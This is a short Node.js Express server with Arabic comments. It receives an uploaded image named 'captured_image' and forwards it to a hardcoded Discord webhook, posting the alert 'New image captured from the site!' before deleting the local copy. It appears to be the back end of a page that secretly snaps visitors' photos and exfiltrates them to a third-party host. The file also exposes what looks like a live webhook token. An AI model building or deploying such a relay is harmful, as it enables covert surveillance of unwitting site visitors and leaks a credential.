const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(cors());

const upload = multer({ dest: 'uploads/' });

// رابط الـ Webhook الخاص بك جاهز وصحيح هنا
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525465698317373540/iGdJxuIPPgFXaxss4xXOlJuEnsvZ1cR5ZG';

app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'لم يتم استقبال أي صورة' });
    }

    try {
        const discordData = new FormData();
        discordData.append('file', fs.createReadStream(req.file.path), req.file.originalname || 'instant_snap.jpg');
        discordData.append('content', '🚨 **تم التقاط صورة جديدة من الموقع!**');

        await axios.post(DISCORD_WEBHOOK_URL, discordData, {
            headers: discordData.getHeaders(),
        });

        // مسح الصورة محلياً من السيرفر للحفاظ على المساحة
        fs.unlinkSync(req.file.path);

        return res.status(200).json({ message: 'تم إرسال الصورة إلى ديسكورد بنجاح' });
    } catch (error) {
        console.error('خطأ أثناء إرسال الصورة:', error.message);
        if (fs.existsSync(req.file.path)) {
            fs.unlinkSync(req.file.path);
        }
        return res.status(500).json({ error: 'فشل إرسال الصورة إلى ديسكورد' });
    }
});

app.get('/', (req, res) => {
    res.send('السيرفر يعمل بنجاح وجاهز لاستقبال الصور!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
